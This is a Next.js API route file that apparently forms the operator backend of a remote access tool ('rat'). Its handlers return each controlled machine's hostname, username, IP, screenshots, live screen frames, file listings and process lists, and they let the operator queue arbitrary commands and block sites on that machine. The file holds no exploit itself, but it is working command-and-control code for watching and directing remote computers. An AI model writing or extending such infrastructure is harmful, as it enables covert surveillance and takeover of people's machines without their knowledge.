// app/api/rat/agents/[id]/route.ts
import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'
import { getSession } from '@/lib/auth'

export async function GET(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  console.log('=== GET /api/rat/agents/[id] ===');
  console.log('Params:', params);
  
  try {
    const session = await getSession()
    console.log('Session:', session ? 'Authenticated' : 'Not authenticated');
    
    if (!session) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const agentId = decodeURIComponent(params.id)
    console.log('Agent ID:', agentId);

    // Test database connection first
    try {
      await sql`SELECT 1`;
      console.log('Database connection OK');
    } catch (dbError) {
      console.error('Database connection failed:', dbError);
      return NextResponse.json({ 
        error: 'Database connection failed', 
        details: dbError instanceof Error ? dbError.message : String(dbError)
      }, { status: 500 });
    }

    // Get agent basic info
    console.log('Fetching agent...');
    const [agent] = await sql`
      SELECT 
        id, hostname, username, platform, ip, alias, last_seen,
        screenshot_b64, files_json, file_cwd, processes_json,
        (last_seen > NOW() - INTERVAL '15 seconds') AS connected
      FROM rat_agents 
      WHERE id = ${agentId}
    `
    console.log('Agent result:', agent ? 'Found' : 'Not found');

    if (!agent) {
      return NextResponse.json({ error: 'Agent not found' }, { status: 404 })
    }

    // Get latest stream frame if any
    console.log('Fetching stream frame...');
    const [stream] = await sql`
      SELECT frame_b64, captured_at 
      FROM rat_stream_frames 
      WHERE agent_id = ${agentId}
    `

    // Get blocked sites
    console.log('Fetching blocked sites...');
    const blocked = await sql`
      SELECT domain FROM rat_blocked_sites WHERE agent_id = ${agentId}
    `

    // Get recent messages
    console.log('Fetching messages...');
    const messages = await sql`
      SELECT id, sender, body, created_at 
      FROM rat_messages 
      WHERE agent_id = ${agentId}
      ORDER BY created_at ASC 
      LIMIT 50
    `

    // Parse JSON fields
    let files = null
    let file_cwd = null
    let processes = null

    try {
      if (agent.files_json) {
        console.log('Parsing files_json...');
        files = JSON.parse(agent.files_json)
      }
      if (agent.file_cwd) file_cwd = agent.file_cwd
      if (agent.processes_json) {
        console.log('Parsing processes_json...');
        processes = JSON.parse(agent.processes_json)
      }
    } catch (e) {
      console.error('Failed to parse JSON for agent:', agentId, e);
    }

    console.log('Successfully built response');
    return NextResponse.json({
      ...agent,
      stream_frame: stream?.frame_b64,
      stream_updated_at: stream?.captured_at,
      blocked_sites: blocked.map(b => b.domain),
      messages,
      files,
      file_cwd,
      processes,
    })
  } catch (error) {
    console.error('=== ERROR in GET /api/rat/agents/[id] ===');
    console.error('Error details:', error);
    console.error('Error stack:', error instanceof Error ? error.stack : 'No stack');
    
    return NextResponse.json({ 
      error: 'Database error', 
      details: error instanceof Error ? error.message : String(error)
    }, { status: 500 })
  }
}

// POST /api/rat/agents/[id] - Send command to agent
export async function POST(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  console.log('=== POST /api/rat/agents/[id] ===');
  
  try {
    const session = await getSession()
    if (!session) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const agentId = decodeURIComponent(params.id)
    console.log('Agent ID:', agentId);
    
    const body = await req.json()
    console.log('Request body:', body);

    const { type, payload } = body

    if (!type) {
      return NextResponse.json({ error: 'Command type required' }, { status: 400 })
    }

    console.log(`Sending command ${type} to agent ${agentId}`)

    // Insert command into database
    const [command] = await sql`
      INSERT INTO rat_commands (agent_id, type, payload)
      VALUES (${agentId}, ${type}, ${JSON.stringify(payload || {})})
      RETURNING id
    `

    console.log('Command inserted with ID:', command.id);

    return NextResponse.json({ 
      success: true, 
      command_id: command.id,
      message: `Command ${type} queued for agent` 
    })
  } catch (error) {
    console.error('=== ERROR in POST /api/rat/agents/[id] ===');
    console.error('Error details:', error);
    return NextResponse.json({ 
      error: 'Failed to send command',
      details: error instanceof Error ? error.message : String(error)
    }, { status: 500 })
  }
}

// PATCH /api/rat/agents/[id] - Update agent (e.g., set alias)
export async function PATCH(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  console.log('=== PATCH /api/rat/agents/[id] ===');
  
  try {
    const session = await getSession()
    if (!session) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const agentId = decodeURIComponent(params.id)
    console.log('Agent ID:', agentId);
    
    const { alias } = await req.json()
    console.log('Alias:', alias);

    await sql`
      UPDATE rat_agents 
      SET alias = ${alias || null}
      WHERE id = ${agentId}
    `

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('=== ERROR in PATCH /api/rat/agents/[id] ===');
    console.error('Error details:', error);
    return NextResponse.json({ error: 'Failed to update agent' }, { status: 500 })
  }
}

// DELETE /api/rat/agents/[id] - Remove agent
export async function DELETE(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  console.log('=== DELETE /api/rat/agents/[id] ===');
  
  try {
    const session = await getSession()
    if (!session) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const agentId = decodeURIComponent(params.id)
    console.log('Agent ID:', agentId);
    
    // Delete related data first (foreign key constraints)
    await sql`DELETE FROM rat_stream_frames WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_messages WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_blocked_sites WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_commands WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_agents WHERE id = ${agentId}`

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('=== ERROR in DELETE /api/rat/agents/[id] ===');
    console.error('Error details:', error);
    return NextResponse.json({ error: 'Failed to delete agent' }, { status: 500 })
  }
}